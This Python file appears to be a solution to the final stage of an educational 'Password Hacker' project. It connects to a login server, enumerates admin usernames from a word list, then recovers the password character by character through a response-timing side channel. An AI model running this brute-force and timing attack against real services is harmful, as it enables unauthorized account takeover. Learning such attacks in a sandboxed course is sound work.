#  Hyperskill Python Developer Track
#  Project: Password Hacker
#  Stage: 5/5 Time Based Vulnerability

import json
import socket
import sys
import string
import itertools
import datetime

char_gen = string.ascii_lowercase + string.ascii_uppercase + string.digits

file_path = r'C:\Users\Gaming\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt'

def load_admin_names(file_path):
    set_user_names = set()
    with open(file_path) as file_user_names:
        for line in file_user_names:
            set_user_names.add(line.strip())
    return set_user_names

def create_json(username, password=' '):
    json_dict = {}
    json_dict["login"], json_dict["password"] = username, password
    return json_dict


class HackerSocket:

    def __init__(self, ip_address, port):
        self.address = (ip_address, port)
        self.socket = socket.socket()
        self.socket.connect(self.address)

    def json_send(self, json_object):
        json_string = json.dumps(json_object)
        encoded_message = json_string.encode('utf8')
        self.socket.send(encoded_message)

    def json_receive(self, size):
        encoded_message = self.socket.recv(size)
        message = encoded_message.decode('utf8')
        return json.loads(message)
    def close(self):
        self.socket.close()


if __name__ == '__main__':
    try:
        ip_address, port = sys.argv[1], int(sys.argv[2])
    except:
        print('There are 2 argument variables that need to be included (IP, port). Program exited without running.')
    hacker_socket = HackerSocket(ip_address, port)
    admin_names = load_admin_names(file_path)
    response = ''
    found_username = 'None Found'

    #  loops through potential admin names until 'Wrong Password' result occurs
    for admin_name in admin_names:
        admin_json = create_json(admin_name)
        hacker_socket.json_send(admin_json)
        response = json.loads(hacker_socket.socket.recv(4096).decode('utf8'))
        if response.get("result") == "Wrong password!":
            found_username = admin_name
            break

    #   loops through characters until pause occurs and generates password from rules defined in problem
    password_response = {}
    num_chars = 1
    num_attempts = 0
    built_password = ''
    while password_response.get("result") != "Connection success!":
        password_response = {}
        pass_generator = itertools.product(char_gen, repeat=num_chars)
        total_time = datetime.timedelta(0)
        while total_time.microseconds < 50000:
            try:
                password_attempt = built_password + ''.join(next(pass_generator))
                initial_time = datetime.datetime.now()
            except StopIteration:
                print(password_response.get("result"))
                raise RuntimeError('Error in password generation')

            admin_json = create_json(found_username, password_attempt)
            hacker_socket.json_send(admin_json)
            try:
                password_response = json.loads(hacker_socket.socket.recv(4096).decode('utf8'))
                final_time = datetime.datetime.now()
                total_time = final_time - initial_time
            except (ConnectionAbortedError, ConnectionResetError):
                break

            num_attempts += 1


            if  total_time.microseconds >= 50000 or password_response.get("result") == "Connection success!":
                built_password = password_attempt
            if num_attempts > 100000:
                print('num attempts exceeded one million, broke loop')
                exit()
    hacker_socket.close()
    print(json.dumps(create_json(found_username, built_password), indent=1))






    
    






